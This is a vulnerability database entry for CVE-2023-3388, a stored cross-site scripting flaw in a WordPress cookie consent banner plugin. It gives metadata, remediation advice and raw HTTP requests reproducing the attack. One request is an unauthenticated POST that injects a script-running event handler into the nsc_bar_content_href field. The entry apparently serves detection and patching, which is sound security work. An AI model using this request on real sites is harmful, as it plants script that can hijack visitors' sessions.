---
layout: post
cve_id: CVE-2023-3388
title: Beautiful Cookie Consent Banner < 2.10.2 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2023/CVE-2023-3388.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-3388.yaml
snort2_rule: N/A
snort3_rule: N/A
author: daffainfo
severity: high
impact: 'Attackers can execute arbitrary scripts in users'' browsers, potentially
  leading to session hijacking, defacement, or redirection.

  '
remediation: 'Update to version 2.10.2 or later.

  '
reference:
- https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2857982%40beautiful-and-responsive-cookie-consent&new=2857982%40beautiful-and-responsive-cookie-consent&sfp_email=&sfph_mail=
- https://www.wordfence.com/blog/2023/05/wordfence-firewall-blocks-bizarre-large-scale-xss-campaign/
- https://www.wordfence.com/threat-intel/vulnerabilities/id/542a4079-b1a2-49bc-9ddd-ba7978c9992e?source=cve
- https://nvd.nist.gov/vuln/detail/CVE-2023-3388
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
  cvss-score: 7.2
  cve-id: CVE-2023-3388
  cwe-id: CWE-79
  epss-score: 0.63522
  epss-percentile: 0.9834
  cpe: cpe:2.3:a:beautiful-cookie-banner:beautiful_cookie_consent_banner:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: beautiful-cookie-banner
  product: beautiful_cookie_consent_banner
  framework: wordpress
tags:
- cve
- cve2023
- wordpress
- wp
- wp-plugin
- beautiful-cookie-banner
- xss
- vkev
---

## ðŸ” Vulnerability Description
The Beautiful Cookie Consent Banner for WordPress is vulnerable to Stored Cross-Site Scripting via the 'nsc_bar_content_href' parameter in versions up to, and including, 2.10.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. A partial patch was made available in 2.10.1 and the issue was fully patched in 2.10.2.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-post.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Connection: close
Content-Length: 220
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
nsc_bar_activate_banner=1&nsc_bar_activate_test_banner=0&nsc_bar_content_href=%22%20style%3ddisplay%3ablock%3bcontent-visibility%3aauto%20oncontentvisibilityautostatechange%3d%22alert(document.domain)&nsc_bar_type=opt-in
```

```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Accept-Encoding: gzip
```

